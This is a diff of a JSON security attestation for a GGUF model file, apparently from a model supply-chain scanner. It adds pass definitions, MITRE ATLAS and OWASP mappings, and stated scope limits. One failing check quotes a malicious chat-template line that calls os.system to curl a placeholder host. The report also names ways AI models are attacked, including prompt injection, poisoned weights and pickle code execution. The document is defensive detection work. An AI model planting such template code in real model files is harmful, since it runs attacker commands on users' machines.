@@ -41,20 +41,70 @@
       "name": "Format and structure",
       "looks_for": "Malformed GGUF structure, unexpected tensors",
       "status": "PASS",
-      "notes": "GGUF v3 parsed: 291 tensors, 41 metadata pairs"
+      "notes": "GGUF v3 parsed: 291 tensors, 41 metadata pairs",
+      "pass_means": "The container parsed, and its tensor data tiles the data section exactly: no unaccounted bytes, overlapping tensors, or duplicate names.",
+      "maps_to": [
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0010.003",
+          "name": "AI Supply Chain Compromise: Model"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM03",
+          "name": "Supply Chain"
+        }
+      ]
     },
     {
       "name": "Chat template (hero)",
-      "looks_for": "Instructions in GGUF metadata that act before user input",
+      "looks_for": "Code reach, hidden or obfuscated text, and override or content-triggered instructions in the chat template",
       "status": "FAIL",
       "evidence": "process-execution: {{ os.system('curl http://example.invalid/x') }} (template can invoke process execution)",
-      "notes": "1 structural code-execution indicator(s). Positive evidence."
+      "notes": "1 structural code-execution indicator(s). Positive evidence.",
+      "pass_means": "The template parsed and reaches no Python internals or process execution, and carries no override or concealment language, URL, hidden or obfuscated text, or condition on message content. Instructions written as ordinary guidance are not detected.",
+      "maps_to": [
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0051",
+          "name": "LLM Prompt Injection"
+        },
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0011.000",
+          "name": "User Execution: Unsafe AI Artifacts"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM01",
+          "name": "Prompt Injection"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM03",
+          "name": "Supply Chain"
+        }
+      ],
+      "severity": "critical"
     },
     {
       "name": "Tokenizer config",
       "looks_for": "Tokenizer metadata anomalies",
       "status": "PASS",
-      "notes": "tokenizer family 'llama' is recognized"
+      "notes": "tokenizer family 'llama' is recognized",
+      "pass_means": "The tokenizer tables are internally consistent, and no control token carries instructions. When a canonical reference table for its family is configured (from a feed or SOCAIR_TOKENIZER_REFERENCE), every token was compared with it and no ordinary token differs; the notes say which reference, or that none was configured or matched.",
+      "maps_to": [
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0010.003",
+          "name": "AI Supply Chain Compromise: Model"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM03",
+          "name": "Supply Chain"
+        }
+      ]
     },
     {
       "name": "Safetensors header and opcodes",
@@ -66,25 +116,92 @@
       "name": "Hash, provenance, lineage",
       "looks_for": "Traceable origin: a manifest bound to this hash, from an immutable upstream commit",
       "status": "PASS",
-      "notes": "publisher unsigned; upstream commit resolved"
+      "notes": "publisher unsigned; upstream commit resolved",
+      "pass_means": "A trusted publisher signature verified over this artifact, or an operator-supplied manifest binds this hash to a repository at an immutable commit. The notes say which; a manifest is the operator's claim, not a signature.",
+      "maps_to": [
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0010.003",
+          "name": "AI Supply Chain Compromise: Model"
+        },
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0058",
+          "name": "Publish Poisoned Models"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM03",
+          "name": "Supply Chain"
+        }
+      ]
     },
     {
       "name": "Known-bad hash match",
       "looks_for": "Match against the known-bad artifact denylist",
       "status": "PASS",
-      "notes": "no denylist entry matched"
+      "notes": "no denylist entry matched",
+      "pass_means": "This exact hash is not on the configured denylist. Any changed byte gives a new hash, so it catches only known files.",
+      "maps_to": [
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0058",
+          "name": "Publish Poisoned Models"
+        },
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0010.003",
+          "name": "AI Supply Chain Compromise: Model"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM03",
+          "name": "Supply Chain"
+        }
+      ]
     },
     {
       "name": "Quant match",
       "looks_for": "Declared quantization (file name) against the tensor types in the file",
       "status": "PASS",
-      "notes": "declared Q5_K_M matches observed file type 17"
+      "notes": "declared Q5_K_M matches observed file type 17",
+      "pass_means": "At least one tensor has the base type the declared quantization requires. This checks labeling, not safety.",
+      "maps_to": [
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0010.003",
+          "name": "AI Supply Chain Compromise: Model"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM03",
+          "name": "Supply Chain"
+        }
+      ]
     },
     {
       "name": "Pickle opcode scan",
       "looks_for": "Serialized code gadgets in pickle-based model files",
       "status": "NOT_TESTED",
-      "notes": "artifact is GGUF, not a pickle format"
+      "notes": "artifact is GGUF, not a pickle format",
+      "pass_means": "Every import the pickle makes is on the reviewed safe list.",
+      "maps_to": [
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0011.000",
+          "name": "User Execution: Unsafe AI Artifacts"
+        },
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0010.003",
+          "name": "AI Supply Chain Compromise: Model"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM03",
+          "name": "Supply Chain"
+        }
+      ]
     },
     {
       "name": "Forward-pass trigger probes (Tier 2)",
@@ -94,28 +211,40 @@
     }
   ],
   "findings": {
-    "fails": ["Chat template (hero)"],
-    "not_tested": ["Safetensors header and opcodes", "Forward-pass trigger probes (Tier 2)"]
+    "fails": [
+      "Chat template (hero)"
+    ],
+    "not_tested": [
+      "Safetensors header and opcodes",
+      "Forward-pass trigger probes (Tier 2)"
+    ]
   },
   "assurance_level": {
     "awarded": "Tier 1 (static)",
-    "definition": "Static, portable checks on the artifact and its metadata.",
-    "does_mean": "The named checks were run on the exact artifact hash within their stated scope.",
-    "does_not_mean": "Nothing outside the named scope was tested, and no absence of unknown backdoors is certified.",
-    "tier2_note": "Tier 2 forward-pass checks on the production node class were not run."
+    "definition": "Static checks on the artifact's bytes and metadata, run offline. No inference is run, and the weights are not evaluated for behavior.",
+    "does_mean": "Each listed check ran on the exact bytes identified by the artifact hash, and each row states what its PASS means. A FAIL carries positive evidence, a LEAD needs escalated review, and a NOT_TESTED names why it was not tested.",
+    "does_not_mean": "It is not an assessment of the model's behavior or safety. It does not test the weights for backdoors or poisoning, behavior that appears only after quantization or on particular hardware, or jailbreak susceptibility and harmful capability, and it does not check licensing.",
+    "tier2_note": "Tier 2 (inference on the production node class) did not run."
   },
   "bounded_statement": "For the artifact identified by hash in Section 2, served on the node class named in Section 3, the checks listed in Section 4 found no indicators within their stated scope. Every surface outside that scope is enumerated as NOT_TESTED in Section 8.",
   "out_of_scope": {
     "does_not_certify": "This attestation does not certify the absence of unknown backdoors.",
     "ceiling": [
-      "Unknown triggers outside our probe library.",
-      "Differential behavior across serving stacks, unless Tier 2 ran on the production node class.",
-      "Sleeper or polymorphic behavior that needs more inference budget than we run.",
+      "Backdoors, trojans, or poisoning in the model weights. Tier 1 reads the weights' layout, never their behavior.",
+      "Triggered, sleeper, or polymorphic behavior. Tier 1 runs no inference.",
+      "Behavior that appears only after quantization, or only on particular hardware or serving stacks, unless Tier 2 ran on the production node class.",
+      "Behavioral safety: jailbreak susceptibility, harmful capability, and bias.",
+      "Malicious behavior that only emerges at runtime under real traffic.",
       "Artifact formats we do not parse.",
-      "Malicious behavior that only emerges at runtime under real traffic."
+      "Pickle code execution reached only through imports on the reviewed safe list.",
+      "Chat-template instructions written as ordinary guidance (no override or concealment phrase, URL, hidden or obfuscated text, or condition on message content), unless the template matches a reviewed template.",
+      "License and usage-policy compliance."
     ],
     "unparsed_formats": [],
-    "untested_node_classes": ["cuda-sm90", "apple-m3"]
+    "untested_node_classes": [
+      "cuda-sm90",
+      "apple-m3"
+    ]
   },
   "promotion_authorization": {
     "authorized": false,
